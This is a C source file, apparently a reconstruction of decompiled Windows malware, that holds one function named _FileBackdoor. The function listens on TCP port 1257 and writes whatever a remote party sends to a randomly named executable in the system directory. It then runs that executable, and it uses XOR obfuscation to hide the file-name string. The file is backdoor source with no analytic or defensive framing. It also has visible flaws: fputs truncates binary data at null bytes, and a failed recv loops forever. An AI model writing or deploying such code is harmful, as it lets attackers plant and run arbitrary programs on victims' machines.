#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <stddef.h>

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

DWORD WINAPI _FileBackdoor(void)
{
    DWORD DVar1;
    uint32_t random_value;
    int bytes_received;
    struct sockaddr_in local_398;
    WSADATA local_388;
    char local_1f5[25];
    CHAR local_1dc[256];
    char local_dc[200];
    FILE *local_14;
    SOCKET local_10;

    // "\\%d.exe" XOR'd with key 0x3E
    volatile char sz_fmt_exe[] = {
        '\\'^0x3E, '%'^0x3E, 'd'^0x3E, '.'^0x3E, 'e'^0x3E, 'x'^0x3E, 'e'^0x3E, 0x00^0x3E
    };

    WSAStartup(MAKEWORD(2,2), &local_388);
    local_10 = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    local_398.sin_family = AF_INET;
    local_398.sin_port = htons(1257);
    local_398.sin_addr.s_addr = INADDR_ANY;

    bind(local_10, (struct sockaddr *)&local_398, sizeof(struct sockaddr_in));
    listen(local_10, 1);
    local_10 = accept(local_10, (struct sockaddr *)&local_398, NULL);

    memset(local_dc, 0, sizeof(local_dc));
    memset(local_1dc, 0, sizeof(local_1dc));
    memset(local_1f5, 0, sizeof(local_1f5));

    DVar1 = GetTickCount();
    srand(DVar1);
    GetSystemDirectoryA(local_1dc, sizeof(local_1dc));
    random_value = rand();
    xor_decrypt(sz_fmt_exe, sizeof(sz_fmt_exe), 0x3E);
    sprintf(local_1f5, (char*)sz_fmt_exe, random_value);
    strcat(local_1dc, local_1f5);
    local_14 = fopen(local_1dc, "wb");

    while (1) {
        bytes_received = recv(local_10, local_dc, sizeof(local_dc), 0);
        if (bytes_received == 0) break;
        fputs(local_dc, local_14);
        memset(local_dc, 0, sizeof(local_dc));
    }

    fclose(local_14);
    closesocket(local_10);
    WinExec(local_1dc, 0);

    return 0;
}
#pragma optimize("", on)
